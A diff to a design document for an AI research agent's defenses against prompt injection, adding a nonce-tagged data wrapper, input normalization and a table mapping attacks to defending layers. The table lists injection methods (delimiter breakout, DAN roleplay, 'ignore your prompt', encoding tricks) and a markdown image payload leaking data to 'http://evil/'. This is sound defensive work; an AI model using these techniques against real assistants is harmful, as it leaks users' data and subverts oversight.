@@ -57,6 +57,28 @@ and fed in a data channel, never concatenated into the instruction channel. "Ign
 instructions…" sitting in the data channel is just a string to triage — it has no privileged power
 to rewrite the role. **This is the structural defense for requirement 3 (social engineering).**
 
+The wrapper (`wrap_untrusted`) is built so the boundary cannot be forged. A fixed, known delimiter is
+useless here — the code is open, so an attacker can just type the closing tag inside their text to
+"break out" of the data block. The construction therefore combines four things:
+
+- **XML-ish tags** for model adherence — Claude is trained to respect XML structure separating data
+  from instructions.
+- **An unguessable nonce in the tag** (`<untrusted_data id="<nonce>">…</untrusted_data:<nonce>>`),
+  freshly minted per request and injected by the caller. The attacker cannot forge the closer
+  because they cannot predict the nonce — this is the real anti-breakout mechanism, stronger than
+  escaping alone.
+- **Escaping/neutralization** of any occurrence of the tag or nonce in the text (belt-and-suspenders;
+  also handles legitimate content that happens to contain markup).
+- **The system-prompt directive** (Layer 3) stating everything inside the tags is data and must never
+  be obeyed — because structure alone does not stop the model from *choosing* to follow embedded text
+  ("obey-in-place").
+
+The wrapper also performs input hygiene that closes a class of obfuscation: **unicode normalization +
+stripping zero-width / control / bidi-override characters** (defeats homoglyph and hidden-character
+smuggling) and a **max-length cap** (defeats context-flooding that dilutes the system prompt). The
+wrapper owns only the *structural* boundary; the semantic "don't obey" guarantee is Layer 3 and the
+fact that obeyed instructions still cannot actuate anything is Layer 0.
+
 **Layer 3 — Constrained output + role re-grounding.** The agent does not emit free-form chat; each
 step emits a typed artifact (`TriageSpec`, `Hypothesis`, cited narrative). The role/system prompt is
 re-sent every step from a fixed template, so it cannot erode over a multi-turn conversation. **The
@@ -92,6 +114,27 @@ Mapping requirements → mechanisms:
 | no wet-lab / private DB / scraping | capability-by-construction now; per-tool egress allowlist + per-node least privilege as tools grow | 0, future-tool design |
 | don't fabricate evidence | output validator: ids/citations resolve to provenance; LLM emits no numbers | 4 (#20) |
 | resist social engineering / stay in role | trust boundary (data≠instructions) + constrained output + per-step prompt; gate logs attempts | 2 (#19), 3 |
+
+## Attack surface — where each exploit is actually defended
+
+No single layer stops everything; each attack is owned by the layer that *structurally* defeats it.
+The wrapper deliberately owns only a few rows — assigning it the rest would be the same
+false-confidence trap as a keyword gate.
+
+| Exploit | What it does | Defended by |
+|---|---|---|
+| Delimiter breakout | types the closing tag to escape the data block | **wrapper**: nonce + escaping |
+| Accidental collision | real abstract contains the tag / markup | **wrapper**: escaping |
+| Obey-in-place | model follows "ignore your prompt" *without* breaking out | system prompt (L3) + constrained output |
+| Encoding obfuscation | base64 / ROT13 / homoglyphs / zero-width / RTL chars | **wrapper**: normalize + strip; then capability-by-construction (L0) |
+| Output markdown injection | `![](http://evil/?leak=…)` to exfiltrate / phish via the rendered view | render-layer output sanitization (#25/#26) |
+| Exfiltration via crafted citation/URL | smuggle data into a fake citation link | output validator (L4, #20) |
+| Context flooding | giant query pushes the system prompt out of attention | **wrapper/gate**: max-length cap; re-grounding (L3) |
+| Multi-turn smuggling | split the injection across turns | per-step role re-grounding (L3); history-as-data |
+| Manual spec-field injection | prose in an element/bound field | pydantic schema validation (typed fields) |
+| Roleplay / hypothetical / DAN | "for a story, ignore your rules" | system prompt (L3) + capability-by-construction (L0) |
+| Denylist evasion | `s y n t h e s i z e`, soft-hyphens | **gate**: normalize + collapse whitespace; capability-by-construction (L0) |
+| Tool-arg injection (future) | craft a URL/arg for a future tool to a private host | per-tool egress allowlist + per-node least privilege |
 
 ## Trade-offs (accepted)
 
